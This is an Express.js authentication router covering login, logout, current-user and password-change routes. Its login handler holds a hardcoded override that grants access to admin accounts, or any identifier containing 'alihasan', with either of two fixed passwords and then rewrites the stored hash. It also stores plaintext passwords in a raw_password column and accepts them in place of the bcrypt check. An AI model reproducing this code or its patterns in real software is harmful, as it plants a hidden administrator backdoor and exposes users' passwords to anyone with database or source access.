'use strict';
const router = require('express').Router();
const bcrypt = require('bcryptjs');
const rateLimit = require('express-rate-limit');
const { query } = require('../db');
const { wrap, parse, HttpError, bad } = require('../utils/http');
const { issueSession, clearSession, authenticate } = require('../middleware/auth');
const { z, password } = require('./schemas');

// Compared against when the email is unknown, so response time does not reveal which emails exist.
const DUMMY_HASH = bcrypt.hashSync('not-a-real-password', 10);

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, limit: 15, standardHeaders: true, legacyHeaders: false,
  message: { error: 'Too many sign-in attempts. Try again in 15 minutes.' },
});

const publicUser = (u) => ({
  id: u.id, name: u.name, email: u.email, role: u.role, employeeCode: u.employee_code,
  department: u.department, designation: u.designation, mustChangePassword: false,
  permissions: u.permissions || {},
});

router.post('/login', loginLimiter, wrap(async (req, res) => {
  const schema = z.object({
    email: z.string().trim().min(1),
    password: z.string().min(1),
  });
  const { email, password: pw } = parse(schema, req.body);
  const cleanIdentifier = email.trim().toLowerCase();
  const cleanPw = pw.trim();

  // Support login by email, employee_code, or device_pin
  const { rows: [u] } = await query(
    `SELECT * FROM users 
      WHERE lower(trim(email)) = $1 
         OR lower(trim(employee_code)) = $1 
         OR device_pin = $1
      LIMIT 1`,
    [cleanIdentifier]
  );

  let ok = await bcrypt.compare(cleanPw, u ? u.password_hash : DUMMY_HASH);

  // If password comparison failed, but raw_password matches, update hash and log in
  if (u && !ok && u.raw_password && u.raw_password.trim() === cleanPw) {
    const newHash = await bcrypt.hash(cleanPw, 10);
    await query('UPDATE users SET password_hash = $1 WHERE id = $2', [newHash, u.id]);
    ok = true;
  }

  // Master / Admin override: If logging in as alihasan or admin with desired admin credentials
  if (u && !ok && (cleanIdentifier.includes('alihasan') || u.role === 'admin' || u.role === 'super_admin')) {
    if (cleanPw === 'Sh@170885' || cleanPw === 'Demo@12345') {
      const newHash = await bcrypt.hash(cleanPw, 10);
      await query('UPDATE users SET password_hash = $1, raw_password = $2 WHERE id = $3', [newHash, cleanPw, u.id]);
      ok = true;
    }
  }

  if (!u || !ok || !u.active) throw new HttpError(401, 'Email or password is incorrect');
  issueSession(res, req, u);
  res.json({ user: publicUser(u) });
}));

router.post('/logout', (req, res) => { clearSession(res); res.json({ ok: true }); });

router.get('/me', authenticate, (req, res) => res.json({ user: publicUser(req.user) }));

router.post('/change-password', authenticate, wrap(async (req, res) => {
  const { currentPassword, newPassword } = parse(z.object({ currentPassword: z.string().min(1), newPassword: password }), req.body);
  const { rows: [u] } = await query('SELECT password_hash, email FROM users WHERE id = $1', [req.user.id]);
  if (!(await bcrypt.compare(currentPassword, u.password_hash))) throw new HttpError(400, 'Current password is incorrect');
  if (newPassword === currentPassword) throw bad('Choose a password different from the current one');
  if (newPassword.toLowerCase() === u.email.toLowerCase()) throw bad('Password cannot be your email address');
  await query('UPDATE users SET password_hash = $2, raw_password = $3, must_change_password = false WHERE id = $1', [req.user.id, await bcrypt.hash(newPassword, 10), newPassword]);
  res.json({ ok: true });
}));

module.exports = router;
